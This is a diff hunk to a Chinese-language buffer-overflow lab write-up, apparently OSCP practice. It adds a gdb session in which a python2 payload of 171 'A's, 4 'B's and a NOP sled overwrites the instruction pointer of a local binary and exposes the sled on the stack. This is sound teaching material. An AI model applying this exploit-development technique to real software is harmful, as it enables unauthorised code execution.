@@ -181,8 +181,31 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ```
 
+Leave等价于：
+
+movl %ebp %esp
+
+popl %ebp
 
 我们在 171 处得到了精确匹配。现在，我们可以使用 python 命令简单地创建字符串。例如，输入包含具有 171 个 A、4 个 B 和 500 个 nop 的简单输入。
+我们可以使用 gdb 中的参数来进行测试
 ```c
 ./input $(python2 -c 'print "A" * 171 + "B" * 4 + "\x90" * 500')
+```
+
+```c
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ gdb -q input
+Reading symbols from input...
+(No debugging symbols found in input)
+(gdb) run $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')
+Starting program: /home/kali/桌面/OSCP/input $(python2 -c 'print "A"*171 + "B"*4 + "\x90"*500')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/s $esp
+0xffffccd0:     '\220' <repeats 200 times>...
+(gdb) 
 ```
